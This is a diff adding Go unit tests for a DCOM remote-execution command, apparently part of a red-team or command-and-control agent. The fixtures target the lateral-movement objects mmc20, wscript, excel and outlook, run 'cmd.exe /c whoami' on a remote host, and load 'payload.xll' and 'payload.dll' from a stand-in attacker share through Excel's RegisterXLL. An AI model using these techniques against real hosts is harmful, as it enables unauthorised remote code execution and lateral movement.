@@ -97,6 +97,12 @@ func TestDcomExecUnknownObject(t *testing.T) {
 	if !strings.Contains(result.Output, "Unknown DCOM object") {
 		t.Errorf("Expected unknown DCOM object error, got: %s", result.Output)
 	}
+	// Verify all valid objects are listed in error message
+	for _, obj := range []string{"mmc20", "shellwindows", "shellbrowser", "wscript", "excel", "outlook"} {
+		if !strings.Contains(result.Output, obj) {
+			t.Errorf("Error message should list %q as available object", obj)
+		}
+	}
 }
 
 func TestDcomActionNormalization(t *testing.T) {
@@ -135,5 +141,104 @@ func TestDcomDefaultObject(t *testing.T) {
 	// Should not fail with "Unknown DCOM object" — the actual DCOM call will fail since no remote host
 	if strings.Contains(result.Output, "Unknown DCOM object") {
 		t.Error("Should default to mmc20 when object not specified")
+	}
+}
+
+func TestDcomWScriptDispatch(t *testing.T) {
+	cmd := &DcomCommand{}
+	params, _ := json.Marshal(map[string]string{
+		"action": "exec", "host": "192.168.1.1", "command": "cmd.exe", "args": "/c whoami", "object": "wscript",
+	})
+	task := structs.Task{Params: string(params)}
+	result := cmd.Execute(task)
+	// Should not fail with "Unknown DCOM object" — dispatches to wscript handler
+	if strings.Contains(result.Output, "Unknown DCOM object") {
+		t.Error("wscript should be a recognized DCOM object")
+	}
+	// Should fail with CoCreateInstanceEx (no remote host) not "Unknown"
+	if strings.Contains(result.Output, "Unknown action") {
+		t.Error("Should reach wscript handler, not unknown action")
+	}
+}
+
+func TestDcomExcelDispatch(t *testing.T) {
+	cmd := &DcomCommand{}
+	params, _ := json.Marshal(map[string]string{
+		"action": "exec", "host": "192.168.1.1", "command": "cmd.exe", "object": "excel",
+	})
+	task := structs.Task{Params: string(params)}
+	result := cmd.Execute(task)
+	// Should not fail with "Unknown DCOM object"
+	if strings.Contains(result.Output, "Unknown DCOM object") {
+		t.Error("excel should be a recognized DCOM object")
+	}
+}
+
+func TestDcomExcelRegisterXLLDetection(t *testing.T) {
+	cmd := &DcomCommand{}
+	// Command ending in .xll should trigger RegisterXLL path
+	params, _ := json.Marshal(map[string]string{
+		"action": "exec", "host": "192.168.1.1", "command": "\\\\attacker\\share\\payload.xll", "object": "excel",
+	})
+	task := structs.Task{Params: string(params)}
+	result := cmd.Execute(task)
+	// Will fail on CoCreateInstanceEx but should reach Excel handler
+	if strings.Contains(result.Output, "Unknown DCOM object") {
+		t.Error("excel should be recognized")
+	}
+}
+
+func TestDcomExcelDLLDetection(t *testing.T) {
+	cmd := &DcomCommand{}
+	// Command ending in .dll should also trigger RegisterXLL path
+	params, _ := json.Marshal(map[string]string{
+		"action": "exec", "host": "192.168.1.1", "command": "\\\\attacker\\share\\payload.dll", "object": "excel",
+	})
+	task := structs.Task{Params: string(params)}
+	result := cmd.Execute(task)
+	if strings.Contains(result.Output, "Unknown DCOM object") {
+		t.Error("excel should be recognized")
+	}
+}
+
+func TestDcomCLSIDConstantsExpanded(t *testing.T) {
+	if clsidWScriptShell == nil {
+		t.Error("WScript.Shell CLSID should not be nil")
+	}
+	if clsidExcelApp == nil {
+		t.Error("Excel.Application CLSID should not be nil")
+	}
+	if clsidOutlookApp == nil {
+		t.Error("Outlook.Application CLSID should not be nil")
+	}
+}
+
+func TestDcomOutlookDispatch(t *testing.T) {
+	cmd := &DcomCommand{}
+	params, _ := json.Marshal(map[string]string{
+		"action": "exec", "host": "192.168.1.1", "command": "cmd.exe", "args": "/c whoami", "object": "outlook",
+	})
+	task := structs.Task{Params: string(params)}
+	result := cmd.Execute(task)
+	// Should not fail with "Unknown DCOM object" — dispatches to outlook handler
+	if strings.Contains(result.Output, "Unknown DCOM object") {
+		t.Error("outlook should be a recognized DCOM object")
+	}
+	// Should fail with CoCreateInstanceEx (no remote host) not "Unknown"
+	if strings.Contains(result.Output, "Unknown action") {
+		t.Error("Should reach outlook handler, not unknown action")
+	}
+}
+
+func TestDcomOutlookRequiresOutlook(t *testing.T) {
+	cmd := &DcomCommand{}
+	params, _ := json.Marshal(map[string]string{
+		"action": "exec", "host": "192.168.1.1", "command": "cmd.exe", "object": "outlook",
+	})
+	task := structs.Task{Params: string(params)}
+	result := cmd.Execute(task)
+	// The error should mention Outlook installation requirement
+	if result.Status == "success" {
+		t.Error("Should fail without remote host connectivity")
 	}
 }
